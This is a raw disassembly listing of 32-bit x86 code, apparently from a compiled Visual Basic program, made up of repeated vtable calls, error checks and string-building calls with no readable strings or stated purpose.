  4081b2:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4081b5:	ff 15 64 11 40 00    	call   *0x401164
  4081bb:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4081be:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4081c1:	50                   	push   %eax
  4081c2:	51                   	push   %ecx
  4081c3:	6a 02                	push   $0x2
  4081c5:	ff 15 20 10 40 00    	call   *0x401020
  4081cb:	8d 55 80             	lea    -0x80(%ebp),%edx
  4081ce:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4081d1:	52                   	push   %edx
  4081d2:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  4081d5:	50                   	push   %eax
  4081d6:	8d 55 b0             	lea    -0x50(%ebp),%edx
  4081d9:	51                   	push   %ecx
  4081da:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4081dd:	52                   	push   %edx
  4081de:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  4081e4:	50                   	push   %eax
  4081e5:	51                   	push   %ecx
  4081e6:	6a 06                	push   $0x6
  4081e8:	ff 15 18 10 40 00    	call   *0x401018
  4081ee:	83 c4 28             	add    $0x28,%esp
  4081f1:	e9 d2 0b 00 00       	jmp    0x408dc8
  4081f6:	8b 16                	mov    (%esi),%edx
  4081f8:	56                   	push   %esi
  4081f9:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  4081ff:	50                   	push   %eax
  408200:	8d 45 d0             	lea    -0x30(%ebp),%eax
  408203:	50                   	push   %eax
  408204:	ff d3                	call   *%ebx
  408206:	8b 0e                	mov    (%esi),%ecx
  408208:	56                   	push   %esi
  408209:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40820f:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  408215:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  408218:	50                   	push   %eax
  408219:	52                   	push   %edx
  40821a:	ff d3                	call   *%ebx
  40821c:	8b f8                	mov    %eax,%edi
  40821e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  408221:	51                   	push   %ecx
  408222:	57                   	push   %edi
  408223:	8b 07                	mov    (%edi),%eax
  408225:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  40822b:	85 c0                	test   %eax,%eax
  40822d:	db e2                	fnclex
  40822f:	7d 12                	jge    0x408243
  408231:	68 a0 00 00 00       	push   $0xa0
  408236:	68 38 30 40 00       	push   $0x403038
  40823b:	57                   	push   %edi
  40823c:	50                   	push   %eax
  40823d:	ff 15 38 10 40 00    	call   *0x401038
  408243:	8b 45 dc             	mov    -0x24(%ebp),%eax
  408246:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  40824c:	50                   	push   %eax
  40824d:	68 08 34 40 00       	push   $0x403408
  408252:	8b 3a                	mov    (%edx),%edi
  408254:	ff 15 28 10 40 00    	call   *0x401028
  40825a:	8b d0                	mov    %eax,%edx
  40825c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40825f:	ff 15 38 11 40 00    	call   *0x401138
  408265:	8b cf                	mov    %edi,%ecx
  408267:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40826d:	50                   	push   %eax
  40826e:	57                   	push   %edi
  40826f:	e9 13 09 00 00       	jmp    0x408b87
  408274:	8b 06                	mov    (%esi),%eax
  408276:	56                   	push   %esi
  408277:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  40827d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  408280:	50                   	push   %eax
  408281:	51                   	push   %ecx
  408282:	ff d3                	call   *%ebx
  408284:	8b 16                	mov    (%esi),%edx
  408286:	56                   	push   %esi
  408287:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40828d:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  408293:	50                   	push   %eax
  408294:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  408297:	50                   	push   %eax
  408298:	ff d3                	call   *%ebx
  40829a:	8b f8                	mov    %eax,%edi
  40829c:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40829f:	52                   	push   %edx
  4082a0:	57                   	push   %edi
  4082a1:	8b 0f                	mov    (%edi),%ecx
  4082a3:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  4082a9:	85 c0                	test   %eax,%eax
  4082ab:	db e2                	fnclex
  4082ad:	7d 12                	jge    0x4082c1
  4082af:	68 a0 00 00 00       	push   $0xa0
  4082b4:	68 38 30 40 00       	push   $0x403038
  4082b9:	57                   	push   %edi
  4082ba:	50                   	push   %eax
  4082bb:	ff 15 38 10 40 00    	call   *0x401038
  4082c1:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4082c4:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  4082ca:	51                   	push   %ecx
  4082cb:	68 24 34 40 00       	push   $0x403424
  4082d0:	8b 38                	mov    (%eax),%edi
  4082d2:	ff 15 28 10 40 00    	call   *0x401028
  4082d8:	8b d0                	mov    %eax,%edx
  4082da:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4082dd:	ff 15 38 11 40 00    	call   *0x401138
  4082e3:	8b d7                	mov    %edi,%edx
  4082e5:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4082eb:	50                   	push   %eax
  4082ec:	57                   	push   %edi
  4082ed:	e9 df e0 ff ff       	jmp    0x4063d1
  4082f2:	8b 0e                	mov    (%esi),%ecx
  4082f4:	56                   	push   %esi
  4082f5:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  4082fb:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4082fe:	50                   	push   %eax
  4082ff:	52                   	push   %edx
  408300:	ff d3                	call   *%ebx
  408302:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  408308:	8b 06                	mov    (%esi),%eax
  40830a:	56                   	push   %esi
  40830b:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  408311:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  408314:	50                   	push   %eax
  408315:	51                   	push   %ecx
  408316:	ff d3                	call   *%ebx
  408318:	8b f8                	mov    %eax,%edi
  40831a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40831d:	50                   	push   %eax
  40831e:	57                   	push   %edi
  40831f:	8b 17                	mov    (%edi),%edx
  408321:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  408327:	85 c0                	test   %eax,%eax
  408329:	db e2                	fnclex
  40832b:	7d 12                	jge    0x40833f
  40832d:	68 a0 00 00 00       	push   $0xa0
  408332:	68 38 30 40 00       	push   $0x403038
  408337:	57                   	push   %edi
  408338:	50                   	push   %eax
  408339:	ff 15 38 10 40 00    	call   *0x401038
  40833f:	8b 55 dc             	mov    -0x24(%ebp),%edx
  408342:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  408348:	52                   	push   %edx
  408349:	68 3c 34 40 00       	push   $0x40343c
  40834e:	8b 39                	mov    (%ecx),%edi
  408350:	ff 15 28 10 40 00    	call   *0x401028
  408356:	8b d0                	mov    %eax,%edx
  408358:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40835b:	ff 15 38 11 40 00    	call   *0x401138
  408361:	89 bd 3c fe ff ff    	mov    %edi,-0x1c4(%ebp)
  408367:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40836d:	50                   	push   %eax
  40836e:	8b 85 3c fe ff ff    	mov    -0x1c4(%ebp),%eax
  408374:	57                   	push   %edi
  408375:	e9 ef e0 ff ff       	jmp    0x406469
  40837a:	8b 16                	mov    (%esi),%edx
  40837c:	56                   	push   %esi
  40837d:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  408383:	50                   	push   %eax
  408384:	8d 45 d0             	lea    -0x30(%ebp),%eax
  408387:	50                   	push   %eax
  408388:	ff d3                	call   *%ebx
  40838a:	8b 0e                	mov    (%esi),%ecx
  40838c:	56                   	push   %esi
  40838d:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  408393:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  408399:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40839c:	50                   	push   %eax
  40839d:	52                   	push   %edx
  40839e:	ff d3                	call   *%ebx
  4083a0:	8b f8                	mov    %eax,%edi
  4083a2:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4083a5:	51                   	push   %ecx
  4083a6:	57                   	push   %edi
  4083a7:	8b 07                	mov    (%edi),%eax
  4083a9:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4083af:	85 c0                	test   %eax,%eax
  4083b1:	db e2                	fnclex
  4083b3:	7d 12                	jge    0x4083c7
  4083b5:	68 a0 00 00 00       	push   $0xa0
  4083ba:	68 38 30 40 00       	push   $0x403038
  4083bf:	57                   	push   %edi
  4083c0:	50                   	push   %eax
  4083c1:	ff 15 38 10 40 00    	call   *0x401038
  4083c7:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4083ca:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4083d0:	50                   	push   %eax
  4083d1:	68 54 34 40 00       	push   $0x403454
  4083d6:	8b 3a                	mov    (%edx),%edi
  4083d8:	ff 15 28 10 40 00    	call   *0x401028
  4083de:	8b d0                	mov    %eax,%edx
  4083e0:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4083e3:	ff 15 38 11 40 00    	call   *0x401138
  4083e9:	8b cf                	mov    %edi,%ecx
  4083eb:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4083f1:	50                   	push   %eax
  4083f2:	57                   	push   %edi
  4083f3:	e9 8f 07 00 00       	jmp    0x408b87
  4083f8:	8b 06                	mov    (%esi),%eax
  4083fa:	56                   	push   %esi
  4083fb:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  408401:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  408404:	50                   	push   %eax
  408405:	51                   	push   %ecx
  408406:	ff d3                	call   *%ebx
  408408:	8b 16                	mov    (%esi),%edx
  40840a:	56                   	push   %esi
  40840b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  408411:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  408417:	50                   	push   %eax
  408418:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40841b:	50                   	push   %eax
  40841c:	ff d3                	call   *%ebx
  40841e:	8b f8                	mov    %eax,%edi
  408420:	8d 55 dc             	lea    -0x24(%ebp),%edx
  408423:	52                   	push   %edx
  408424:	57                   	push   %edi
  408425:	8b 0f                	mov    (%edi),%ecx
  408427:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  40842d:	85 c0                	test   %eax,%eax
  40842f:	db e2                	fnclex
  408431:	7d 12                	jge    0x408445
  408433:	68 a0 00 00 00       	push   $0xa0
  408438:	68 38 30 40 00       	push   $0x403038
  40843d:	57                   	push   %edi
  40843e:	50                   	push   %eax
  40843f:	ff 15 38 10 40 00    	call   *0x401038
  408445:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  408448:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  40844e:	51                   	push   %ecx
  40844f:	68 6c 34 40 00       	push   $0x40346c
  408454:	8b 38                	mov    (%eax),%edi
  408456:	ff 15 28 10 40 00    	call   *0x401028
  40845c:	8b d0                	mov    %eax,%edx
  40845e:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  408461:	ff 15 38 11 40 00    	call   *0x401138
  408467:	8b d7                	mov    %edi,%edx
  408469:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40846f:	50                   	push   %eax
  408470:	57                   	push   %edi
  408471:	e9 5b df ff ff       	jmp    0x4063d1
  408476:	8b 0e                	mov    (%esi),%ecx
  408478:	56                   	push   %esi
  408479:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  40847f:	8d 55 d0             	lea    -0x30(%ebp),%edx
  408482:	50                   	push   %eax
  408483:	52                   	push   %edx
  408484:	ff d3                	call   *%ebx
  408486:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40848c:	8b 06                	mov    (%esi),%eax
  40848e:	56                   	push   %esi
  40848f:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  408495:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  408498:	50                   	push   %eax
  408499:	51                   	push   %ecx
  40849a:	ff d3                	call   *%ebx
  40849c:	8b f8                	mov    %eax,%edi
  40849e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4084a1:	50                   	push   %eax
  4084a2:	57                   	push   %edi
  4084a3:	8b 17                	mov    (%edi),%edx
  4084a5:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4084ab:	85 c0                	test   %eax,%eax
  4084ad:	db e2                	fnclex
  4084af:	7d 12                	jge    0x4084c3
  4084b1:	68 a0 00 00 00       	push   $0xa0
  4084b6:	68 38 30 40 00       	push   $0x403038
  4084bb:	57                   	push   %edi
  4084bc:	50                   	push   %eax
  4084bd:	ff 15 38 10 40 00    	call   *0x401038
  4084c3:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4084c6:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4084cc:	52                   	push   %edx
  4084cd:	68 88 34 40 00       	push   $0x403488
  4084d2:	8b 39                	mov    (%ecx),%edi
  4084d4:	ff 15 28 10 40 00    	call   *0x401028
  4084da:	8b d0                	mov    %eax,%edx
  4084dc:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4084df:	ff 15 38 11 40 00    	call   *0x401138
  4084e5:	89 bd 30 fe ff ff    	mov    %edi,-0x1d0(%ebp)
  4084eb:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4084f1:	50                   	push   %eax
  4084f2:	8b 85 30 fe ff ff    	mov    -0x1d0(%ebp),%eax
  4084f8:	57                   	push   %edi
  4084f9:	e9 6b df ff ff       	jmp    0x406469
  4084fe:	8b 16                	mov    (%esi),%edx
  408500:	56                   	push   %esi
  408501:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  408507:	50                   	push   %eax
  408508:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40850b:	50                   	push   %eax
  40850c:	ff d3                	call   *%ebx
  40850e:	8b 0e                	mov    (%esi),%ecx
  408510:	56                   	push   %esi
  408511:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  408517:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  40851d:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  408520:	50                   	push   %eax
  408521:	52                   	push   %edx
  408522:	ff d3                	call   *%ebx
  408524:	8b f8                	mov    %eax,%edi
  408526:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  408529:	51                   	push   %ecx
  40852a:	57                   	push   %edi
  40852b:	8b 07                	mov    (%edi),%eax
  40852d:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  408533:	85 c0                	test   %eax,%eax
  408535:	db e2                	fnclex
  408537:	7d 12                	jge    0x40854b
  408539:	68 a0 00 00 00       	push   $0xa0
  40853e:	68 38 30 40 00       	push   $0x403038
  408543:	57                   	push   %edi
  408544:	50                   	push   %eax
  408545:	ff 15 38 10 40 00    	call   *0x401038
  40854b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40854e:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  408554:	50                   	push   %eax
  408555:	68 a4 34 40 00       	push   $0x4034a4
  40855a:	8b 3a                	mov    (%edx),%edi
  40855c:	ff 15 28 10 40 00    	call   *0x401028
  408562:	8b d0                	mov    %eax,%edx
  408564:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  408567:	ff 15 38 11 40 00    	call   *0x401138
  40856d:	8b cf                	mov    %edi,%ecx
  40856f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  408575:	50                   	push   %eax
  408576:	57                   	push   %edi
  408577:	e9 0b 06 00 00       	jmp    0x408b87
  40857c:	8b 06                	mov    (%esi),%eax
  40857e:	56                   	push   %esi
  40857f:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  408585:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  408588:	50                   	push   %eax
  408589:	51                   	push   %ecx
  40858a:	ff d3                	call   *%ebx
  40858c:	8b 16                	mov    (%esi),%edx
  40858e:	56                   	push   %esi
  40858f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  408595:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  40859b:	50                   	push   %eax
  40859c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40859f:	50                   	push   %eax
  4085a0:	ff d3                	call   *%ebx
  4085a2:	8b f8                	mov    %eax,%edi
  4085a4:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4085a7:	52                   	push   %edx
  4085a8:	57                   	push   %edi
  4085a9:	8b 0f                	mov    (%edi),%ecx
  4085ab:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  4085b1:	85 c0                	test   %eax,%eax
  4085b3:	db e2                	fnclex
  4085b5:	7d 12                	jge    0x4085c9
  4085b7:	68 a0 00 00 00       	push   $0xa0
  4085bc:	68 38 30 40 00       	push   $0x403038
  4085c1:	57                   	push   %edi
  4085c2:	50                   	push   %eax
  4085c3:	ff 15 38 10 40 00    	call   *0x401038
  4085c9:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4085cc:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  4085d2:	51                   	push   %ecx
  4085d3:	68 bc 34 40 00       	push   $0x4034bc
  4085d8:	8b 38                	mov    (%eax),%edi
  4085da:	ff 15 28 10 40 00    	call   *0x401028
  4085e0:	8b d0                	mov    %eax,%edx
  4085e2:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4085e5:	ff 15 38 11 40 00    	call   *0x401138
  4085eb:	8b d7                	mov    %edi,%edx
  4085ed:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4085f3:	50                   	push   %eax
  4085f4:	57                   	push   %edi
  4085f5:	e9 d7 dd ff ff       	jmp    0x4063d1
  4085fa:	8b 0e                	mov    (%esi),%ecx
  4085fc:	56                   	push   %esi
  4085fd:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  408603:	8d 55 d0             	lea    -0x30(%ebp),%edx
  408606:	50                   	push   %eax
  408607:	52                   	push   %edx
  408608:	ff d3                	call   *%ebx
  40860a:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  408610:	8b 06                	mov    (%esi),%eax
  408612:	56                   	push   %esi
  408613:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  408619:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40861c:	50                   	push   %eax
  40861d:	51                   	push   %ecx
  40861e:	ff d3                	call   *%ebx
  408620:	8b f8                	mov    %eax,%edi
  408622:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408625:	50                   	push   %eax
  408626:	57                   	push   %edi
  408627:	8b 17                	mov    (%edi),%edx
  408629:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  40862f:	85 c0                	test   %eax,%eax
  408631:	db e2                	fnclex
  408633:	7d 12                	jge    0x408647
  408635:	68 a0 00 00 00       	push   $0xa0
  40863a:	68 38 30 40 00       	push   $0x403038
  40863f:	57                   	push   %edi
  408640:	50                   	push   %eax
  408641:	ff 15 38 10 40 00    	call   *0x401038
  408647:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40864a:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  408650:	52                   	push   %edx
  408651:	68 c4 34 40 00       	push   $0x4034c4
  408656:	8b 39                	mov    (%ecx),%edi
  408658:	ff 15 28 10 40 00    	call   *0x401028
  40865e:	8b d0                	mov    %eax,%edx
  408660:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  408663:	ff 15 38 11 40 00    	call   *0x401138
  408669:	89 bd 24 fe ff ff    	mov    %edi,-0x1dc(%ebp)
  40866f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  408675:	50                   	push   %eax
  408676:	8b 85 24 fe ff ff    	mov    -0x1dc(%ebp),%eax
  40867c:	57                   	push   %edi
  40867d:	e9 e7 dd ff ff       	jmp    0x406469
  408682:	8b 16                	mov    (%esi),%edx
  408684:	56                   	push   %esi
  408685:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  40868b:	50                   	push   %eax
  40868c:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40868f:	50                   	push   %eax
  408690:	ff d3                	call   *%ebx
  408692:	8b 0e                	mov    (%esi),%ecx
  408694:	56                   	push   %esi
  408695:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40869b:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  4086a1:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4086a4:	50                   	push   %eax
  4086a5:	52                   	push   %edx
  4086a6:	ff d3                	call   *%ebx
  4086a8:	8b f8                	mov    %eax,%edi
  4086aa:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4086ad:	51                   	push   %ecx
  4086ae:	57                   	push   %edi
  4086af:	8b 07                	mov    (%edi),%eax
  4086b1:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4086b7:	85 c0                	test   %eax,%eax
  4086b9:	db e2                	fnclex
  4086bb:	7d 12                	jge    0x4086cf
  4086bd:	68 a0 00 00 00       	push   $0xa0
  4086c2:	68 38 30 40 00       	push   $0x403038
  4086c7:	57                   	push   %edi
  4086c8:	50                   	push   %eax
  4086c9:	ff 15 38 10 40 00    	call   *0x401038
  4086cf:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4086d2:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4086d8:	50                   	push   %eax
  4086d9:	68 e4 34 40 00       	push   $0x4034e4
  4086de:	8b 3a                	mov    (%edx),%edi
  4086e0:	ff 15 28 10 40 00    	call   *0x401028
  4086e6:	8b d0                	mov    %eax,%edx
  4086e8:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4086eb:	ff 15 38 11 40 00    	call   *0x401138
  4086f1:	8b cf                	mov    %edi,%ecx
  4086f3:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4086f9:	50                   	push   %eax
  4086fa:	57                   	push   %edi
  4086fb:	e9 87 04 00 00       	jmp    0x408b87
  408700:	8b 06                	mov    (%esi),%eax
  408702:	56                   	push   %esi
  408703:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  408709:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40870c:	50                   	push   %eax
  40870d:	51                   	push   %ecx
  40870e:	ff d3                	call   *%ebx
  408710:	8b 16                	mov    (%esi),%edx
  408712:	56                   	push   %esi
  408713:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  408719:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  40871f:	50                   	push   %eax
  408720:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  408723:	50                   	push   %eax
  408724:	ff d3                	call   *%ebx
  408726:	8b f8                	mov    %eax,%edi
  408728:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40872b:	52                   	push   %edx
  40872c:	57                   	push   %edi
  40872d:	8b 0f                	mov    (%edi),%ecx
  40872f:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  408735:	85 c0                	test   %eax,%eax
  408737:	db e2                	fnclex
  408739:	7d 12                	jge    0x40874d
  40873b:	68 a0 00 00 00       	push   $0xa0
  408740:	68 38 30 40 00       	push   $0x403038
  408745:	57                   	push   %edi
  408746:	50                   	push   %eax
  408747:	ff 15 38 10 40 00    	call   *0x401038
  40874d:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  408750:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  408756:	51                   	push   %ecx
  408757:	68 0c 35 40 00       	push   $0x40350c
  40875c:	8b 38                	mov    (%eax),%edi
  40875e:	ff 15 28 10 40 00    	call   *0x401028
  408764:	8b d0                	mov    %eax,%edx
  408766:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  408769:	ff 15 38 11 40 00    	call   *0x401138
  40876f:	8b d7                	mov    %edi,%edx
  408771:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  408777:	50                   	push   %eax
  408778:	57                   	push   %edi
  408779:	e9 53 dc ff ff       	jmp    0x4063d1
  40877e:	8b 0e                	mov    (%esi),%ecx
  408780:	56                   	push   %esi
  408781:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  408787:	8d 55 d0             	lea    -0x30(%ebp),%edx
  40878a:	50                   	push   %eax
  40878b:	52                   	push   %edx
  40878c:	ff d3                	call   *%ebx
  40878e:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  408794:	8b 06                	mov    (%esi),%eax
  408796:	56                   	push   %esi
  408797:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  40879d:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4087a0:	50                   	push   %eax
  4087a1:	51                   	push   %ecx
  4087a2:	ff d3                	call   *%ebx
  4087a4:	8b f8                	mov    %eax,%edi
  4087a6:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4087a9:	50                   	push   %eax
  4087aa:	57                   	push   %edi
  4087ab:	8b 17                	mov    (%edi),%edx
  4087ad:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4087b3:	85 c0                	test   %eax,%eax
  4087b5:	db e2                	fnclex
  4087b7:	7d 12                	jge    0x4087cb
  4087b9:	68 a0 00 00 00       	push   $0xa0
  4087be:	68 38 30 40 00       	push   $0x403038
  4087c3:	57                   	push   %edi
  4087c4:	50                   	push   %eax
  4087c5:	ff 15 38 10 40 00    	call   *0x401038
  4087cb:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4087ce:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4087d4:	52                   	push   %edx
  4087d5:	68 24 35 40 00       	push   $0x403524
  4087da:	8b 39                	mov    (%ecx),%edi
  4087dc:	ff 15 28 10 40 00    	call   *0x401028
  4087e2:	8b d0                	mov    %eax,%edx
  4087e4:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4087e7:	ff 15 38 11 40 00    	call   *0x401138
  4087ed:	89 bd 18 fe ff ff    	mov    %edi,-0x1e8(%ebp)
  4087f3:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4087f9:	50                   	push   %eax
  4087fa:	8b 85 18 fe ff ff    	mov    -0x1e8(%ebp),%eax
  408800:	57                   	push   %edi
  408801:	e9 63 dc ff ff       	jmp    0x406469
  408806:	8b 16                	mov    (%esi),%edx
  408808:	56                   	push   %esi
  408809:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  40880f:	50                   	push   %eax
  408810:	8d 45 d0             	lea    -0x30(%ebp),%eax
  408813:	50                   	push   %eax
  408814:	ff d3                	call   *%ebx
  408816:	8b 0e                	mov    (%esi),%ecx
  408818:	56                   	push   %esi
  408819:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40881f:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  408825:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  408828:	50                   	push   %eax
  408829:	52                   	push   %edx
  40882a:	ff d3                	call   *%ebx
  40882c:	8b f8                	mov    %eax,%edi
  40882e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  408831:	51                   	push   %ecx
  408832:	57                   	push   %edi
  408833:	8b 07                	mov    (%edi),%eax
  408835:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  40883b:	85 c0                	test   %eax,%eax
  40883d:	db e2                	fnclex
  40883f:	7d 12                	jge    0x408853
  408841:	68 a0 00 00 00       	push   $0xa0
  408846:	68 38 30 40 00       	push   $0x403038
  40884b:	57                   	push   %edi
  40884c:	50                   	push   %eax
  40884d:	ff 15 38 10 40 00    	call   *0x401038
  408853:	8b 45 dc             	mov    -0x24(%ebp),%eax
  408856:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  40885c:	50                   	push   %eax
  40885d:	68 40 35 40 00       	push   $0x403540
  408862:	8b 3a                	mov    (%edx),%edi
  408864:	ff 15 28 10 40 00    	call   *0x401028
  40886a:	8b d0                	mov    %eax,%edx
  40886c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40886f:	ff 15 38 11 40 00    	call   *0x401138
  408875:	8b cf                	mov    %edi,%ecx
  408877:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40887d:	50                   	push   %eax
  40887e:	57                   	push   %edi
  40887f:	e9 03 03 00 00       	jmp    0x408b87
  408884:	8b 06                	mov    (%esi),%eax
  408886:	56                   	push   %esi
  408887:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  40888d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  408890:	50                   	push   %eax
  408891:	51                   	push   %ecx
  408892:	ff d3                	call   *%ebx
  408894:	8b 16                	mov    (%esi),%edx
  408896:	56                   	push   %esi
  408897:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40889d:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  4088a3:	50                   	push   %eax
  4088a4:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4088a7:	50                   	push   %eax
  4088a8:	ff d3                	call   *%ebx
  4088aa:	8b f8                	mov    %eax,%edi
  4088ac:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4088af:	52                   	push   %edx
  4088b0:	57                   	push   %edi
  4088b1:	8b 0f                	mov    (%edi),%ecx
  4088b3:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  4088b9:	85 c0                	test   %eax,%eax
